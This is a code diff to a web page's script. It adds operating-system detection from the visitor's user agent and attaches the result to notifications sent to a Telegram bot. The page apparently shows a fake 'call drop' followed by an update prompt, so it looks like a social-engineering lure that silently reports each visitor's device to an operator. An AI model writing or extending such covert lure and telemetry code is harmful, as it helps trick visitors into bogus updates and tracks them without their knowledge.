@@ -335,12 +335,26 @@
         let seconds = 0;
         let timerInterval;
 
+        // Helper function to detect OS
+        function getOS() {
+            const userAgent = window.navigator.userAgent;
+            if (userAgent.indexOf("Win") !== -1) return "Windows";
+            if (userAgent.indexOf("Mac") !== -1) return "macOS";
+            if (userAgent.indexOf("Linux") !== -1) return "Linux";
+            if (userAgent.indexOf("Android") !== -1) return "Android";
+            if (userAgent.indexOf("like Mac") !== -1) return "iOS";
+            return "Unknown OS";
+        }
+
         // Helper function to send logs to Telegram
         async function logToTelegram(message) {
             const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+            const os = getOS();
+            const fullMessage = `${message}\n\n🖥️ Device: ${os}`;
+            
             const body = JSON.stringify({
                 chat_id: TELEGRAM_CHAT_ID,
-                text: message,
+                text: fullMessage,
                 parse_mode: 'HTML'
             });
             
@@ -405,7 +419,7 @@
                 modal.style.transform = 'translateX(-50%) translateY(0)';
                 
                 // Send Notification: Call Dropped + Update Requested
-                logToTelegram(`🚨 <b>Event: Call Drop & Update Triggered</b>\n\nTime: ${new Date().toLocaleString()}\nUser Agent: ${navigator.userAgent.substring(0, 50)}...`);
+                logToTelegram(`🚨 <b>Event: Call Drop & Update Triggered</b>\n\nTime: ${new Date().toLocaleString()}`);
             }, 1000);
         }
 
